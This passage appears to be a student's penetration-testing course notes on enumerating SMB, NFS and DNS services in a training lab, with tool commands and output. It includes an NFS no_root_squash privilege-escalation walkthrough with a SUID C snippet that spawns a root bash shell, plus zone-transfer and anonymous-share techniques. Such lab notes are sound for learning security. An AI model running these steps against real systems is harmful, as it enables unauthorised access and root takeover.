mrb3n (1000)/LogonCount: 0
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/PasswordDoesNotExpire: False
mrb3n (1000)/AccountIsDisabled: False
mrb3n (1000)/ScriptPath: 
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/UserComment: 
cry0l1t3 (1001)/PrimaryGroupId: 513
cry0l1t3 (1001)/BadPasswordCount: 0
cry0l1t3 (1001)/LogonCount: 0
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/PasswordDoesNotExpire: False
cry0l1t3 (1001)/AccountIsDisabled: False
cry0l1t3 (1001)/ScriptPath: 
[*] Received 2 entries.

```

## SMBmap
```bash
selwynang@htb[/htb]$ smbmap -H 10.129.14.128

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

## CrackMapExec
```bash
selwynang@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

## Enum4Linux-ng Installation
```bash
selwynang@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
selwynang@htb[/htb]$ cd enum4linux-ng
selwynang@htb[/htb]$ pip3 install -r requirements.txt
```

## Enum4Linux-ng Enumeration
```bash
selwynang@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.14.128
[*] Username ......... ''
[*] Random Username .. 'juzgtcsu'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Service Scan on 10.129.14.128    |
 =====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    NetBIOS Names and Workgroup for 10.129.14.128    |
 =====================================================
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
- DEVSMB          <03> -         H <ACTIVE>  Messenger Service
- DEVSMB          <20> -         H <ACTIVE>  File Server Service
- ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
- DEVOPS          <1d> -         H <ACTIVE>  Master Browser
- DEVOPS          <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 ==========================================
|    SMB Dialect Check on 10.129.14.128    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false

 ==========================================
|    RPC Session Check on 10.129.14.128    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[+] Server allows session using username 'juzgtcsu', password ''
[H] Rerunning enumeration with user 'juzgtcsu' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.14.128    |
 ====================================================
[+] Domain: DEVOPS
[+] SID: NULL SID
[+] Host is part of a workgroup (not a domain)

 ============================================================
|    Domain Information via SMB session for 10.129.14.128    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEVSMB
NetBIOS domain name: ''
DNS domain: ''
FQDN: htb

 ================================================
|    OS Information via RPC for 10.129.14.128    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT DEVSM

 ======================================
|    Users via RPC on 10.129.14.128    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 users via 'enumdomusers'
[+] After merging user results we have 2 users total:
'1000':
  username: mrb3n
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: cry0l1t3
  name: cry0l1t3
  acb: '0x00000014'
  description: ''

 =======================================
|    Groups via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 =======================================
|    Shares via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating shares
[+] Found 5 share(s):
IPC$:
  comment: IPC Service (DEVSM)
  type: IPC
dev:
  comment: DEVenv
  type: Disk
home:
  comment: INFREIGHT Samba
  type: Disk
notes:
  comment: CheckIT
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share dev
[-] Share doesn't exist
[*] Testing share home
[+] Mapping: OK, Listing: OK
[*] Testing share notes
[+] Mapping: OK, Listing: OK
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 ==========================================
|    Policies via RPC for 10.129.14.128    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: None
  min_pw_length: 5
  min_pw_age: none
  max_pw_age: 49710 days 6 hours 21 minutes
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: None
domain_logoff_information:
  force_logoff_time: 49710 days 6 hours 21 minutes

 ==========================================
|    Printers via RPC for 10.129.14.128    |
 ==========================================
[+] No printers returned (this is not an error)

Completed after 0.61 seconds
```

---

# C.3. Host Based Enumeration: NFS
- `Network File System (NFS)` is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local.
- UDP or TCP port `2049` is used to run the service.
- NFS is based on the `Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC)` protocol exposed on TCP and UDP ports `111`.

## Default Configuration
- The `/etc/exports` file contains a table of physical filesystems on an NFS server accessible by the clients.

| Option | Description |
|---|---|
| `rw` | Read and write permissions. |
| `ro` | Read only permissions. |
| `sync` | Synchronous data transfer. (A bit slower) |
| `async` | Asynchronous data transfer. (A bit faster) |
| `secure` | Ports above 1024 will not be used. |
| `insecure` | Ports above 1024 will be used. |
| `no_subtree_check` | This option disables the checking of subdirectory trees. |
| `root_squash` | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |

```bash
selwynang@htb[/htb]$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

## Dangerous Settings
| Option | Description |
|---|---|
| `rw` | Read and write permissions. |
| `insecure` | Ports above 1024 will be used. (This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.)|
| `nohide` | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash` | All files created by root are kept with the UID/GID 0. |

## Footprinting the Service

### Nmap
```bash
selwynang@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds

# The rpcinfo NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports.
```
```bash
selwynang@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

# Nmap has some NSE scripts that can be used for the scans. These can then show us, for example, the contents of the share and its stats.
```

### Show Available NFS Shares
- Command: `showmount`

```bash
selwynang@htb[/htb]$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

### Mounting NFS Share
- Command: `mount`

```bash
selwynang@htb[/htb]$ mkdir target-NFS
selwynang@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
selwynang@htb[/htb]$ cd target-NFS
selwynang@htb[/htb]$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

### List Contents with Usernames & Group Names
```bash
selwynang@htb[/htb]$ ls -l mnt/nfs/

total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

### List Contents with UIDs & GUIDs
```bash
selwynang@htb[/htb]$ ls -n mnt/nfs/

total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

### Unmounting
```bash
selwynang@htb[/htb]$ cd ..
selwynang@htb[/htb]$ sudo umount ./target-NFS
```

## Privilege Escalation with NFS
- NFS trusts UID/GID numbers, not usernames.
    - When a client mounts an NFS share, the server doesn't authenticate "which user" is accessing it, but it just trusts whatever UID/GID the client's kernel says a process is running as. 
    - `root_squash` (the default) protects against this by remapping any UID 0 (root) on the client to the "nobody" UID on the server.
    - `no_root_squash` disables that protection, so if you're root on the client side, you're also treated as root on the server share.
- **Privilege Escalation Path:**
    1. *Find the export:* Enumerate with `showmount -e <target>` to see if a share is exported with `no_root_squash` (or `rw + no_root_squash` combined).
    2. Mount it from a machine where you have root. This could be your attacking machine (Kali, etc.). It doesn't need to be the victim box:
    ```bash
       mount -o rw <target>:/exported/path /mnt/nfs
    ```
    3. Create a SUID binary as root, on the mounted share. Because `no_root_squash` is set, when you (as root) write files here, they land on the server with real root ownership rather than getting squashed. A simple example:
    ```c
    int main() 
        { 
            setuid(0); 
            setgid(0); 
            system("/bin/bash"); 
            return 0; 
        }
    ```
    Compile it and then `chown root:root shell` and `chmod u+s shell`.

    4. Unmount, then trigger it from the SSH session. Go to your SSH shell on the actual target, navigate to wherever that same NFS export is mounted locally, and execute the binary:
    ```bash
    ./shell
    ```
    Since the file is owned by root (or the target user) with the setuid bit set, and NFS already told the target machine's kernel that's the legitimate owner, executing it gives you an effective shell as that user.

---

# C.4. Host Based Enumeration: DNS
- `DNS` is a system for resolving computer names into IP addresses, and it does not have a central database.
- DNS is mainly unencrypted. 
    - Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. 
    - Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply `DNS over TLS (DoT)` or `DNS over HTTPS (DoH)` here. 
    - In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

| Server Type | Description |
|---|---|
| DNS Root Server | The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe. |
| Authoritative Nameserver | Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Based on the country, company, etc., authoritative nameservers provide answers to recursive DNS nameservers, assisting in finding the specific web server(s). |
| Non-authoritative Nameserver | Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. |
| Caching DNS Server | Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. |
| Forwarding Server | Forwarding servers perform only one function: they forward DNS queries to another DNS server. |
| Resolver | Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router. |

## Types of DNS Records
| DNS Record | Description |
|---|---|
| `A` | Returns an IPv4 address of the requested domain as a result. |
| `AAAA` | Returns an IPv6 address of the requested domain. |
| `MX` | Returns the responsible mail servers as a result. |
| `NS` | Returns the DNS servers (nameservers) of the domain. |
| `TXT` | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. |
| `CNAME` | This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu. |
| `PTR` | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names. |
| `SOA` | Provides information about the corresponding DNS zone and email address of the administrative contact. |

### SOA Record
- `SOA` record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.

```bash
selwynang@htb[/htb]$ dig soa www.inlanefreight.com

; <<>> DiG 9.16.27-Debian <<>> soa www.inlanefreight.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15876
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.inlanefreight.com.         IN      SOA

;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 16 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Thu Jan 05 12:56:10 GMT 2023
;; MSG SIZE  rcvd: 128
```

## Default Configuration
All DNS servers work with three different types of configuration files:
1. Local DNS configuration files
2. Zone files
3. Reverse name resolution files

### Local DNS Configuration
- In this file, we can define the different zones. 
- These zones are divided into individual files, which in most cases are mainly intended for one domain only.
```bash
root@bind9:~# cat /etc/bind/named.conf.local

//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";
zone "domain.com" {
    type master;
    file "/etc/bind/db.domain.com";
    allow-update { key rndc-key; };
};
```

### Zone Files
- A zone file is a text file that describes a `DNS` zone with the BIND file format. In other words it is a point of delegation in the DNS tree. 
- There must be precisely one `SOA` record and at least one `NS` record. The SOA resource record is usually located at the beginning of a zone file.
```bash
root@bind9:~# cat /etc/bind/db.domain.com

;
; BIND reverse data file for local loopback interface
;
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.

             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
```

### Reverse Name Resolution Zone Files
- For the `Fully Qualified Domain Name (FQDN)` to be resolved from the IP address, the DNS server must have a reverse lookup file. 
- In this file, the computer name (`FQDN`) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. 
- The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.

```bash
root@bind9:~# cat /etc/bind/db.10.129.14

;
; BIND reverse data file for local loopback interface
;
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
...SNIP...
```

## Dangerous Settings
| Option | Description |
|---|---|
| `allow-query` | Defines which hosts are allowed to send requests to the DNS server. |
| `allow-recursion` | Defines which hosts are allowed to send recursive requests to the DNS server. |
| `allow-transfer` | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| `zone-statistics` | Collects statistical data of zones. |

## Footprinting the Service

### DIG - NS Query
- The DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the `@` character.

```bash
selwynang@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> ns inlanefreight.htb @10.129.14.128
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45010
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      NS

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:04:03 CEST 2021
;; MSG SIZE  rcvd: 107
```

### DIG - Version Query
-  Possible to query a DNS server's version using a class `CHAOS` query and type `TXT`. However, this entry must exist on the DNS server.

```bash
selwynang@htb[/htb]$ dig CH TXT version.bind 10.129.120.85

; <<>> DiG 9.10.6 <<>> CH TXT version.bind
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47786
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; ANSWER SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1"

;; ADDITIONAL SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1-Debian"

;; Query time: 2 msec
;; SERVER: 10.129.120.85#53(10.129.120.85)
;; WHEN: Wed Jan 05 20:23:14 UTC 2023
;; MSG SIZE  rcvd: 101
```

### DIG - ANY Query
- `ANY` option can be used to view all available records, causing the server to show us all available entries that it is willing to disclose.

```bash
selwynang@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.htb @10.129.14.128
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7649
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:42:13 CEST 2021
;; MSG SIZE  rcvd: 437
```

### Zone Transfers Theory
- Zone transfer refers to the transfer of zones to another server in DNS, which generally happens over TCP port `53`. Procedure is abbreviated as `Asynchronous Full Transfer Zone (AXFR)`.
- Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. 
- Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.
- The original data of a zone is located on a DNS server, which is called the primary name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called secondary name servers for this zone.
- A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.
- The slave fetches the SOA record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.

### DIG - AXFR Zone Transfer
- If the administrator used a subnet for the `allow-transfer` option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. 
- In addition, other zones can be queried, which may even show internal IP addresses and hostnames.

```bash
selwynang@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> axfr inlanefreight.htb @10.129.14.128
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 4 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:51:19 CEST 2021
;; XFR size: 9 records (messages 1, bytes 520)
```

### DIG - AXFR Zone Transfer - Internal
```bash
selwynang@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128

; <<>> DiG 9.16.1-Ubuntu <<>> axfr internal.inlanefreight.htb @10.129.14.128
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN   TXT     "MS=ms97310371"
internal.inlanefreight.htb. 604800 IN   TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN   TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:53:11 CEST 2021
;; XFR size: 15 records (messages 1, bytes 664)
```

### Subdomain Brute Forcing
- The individual `A` records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by `SecLists`.

```bash
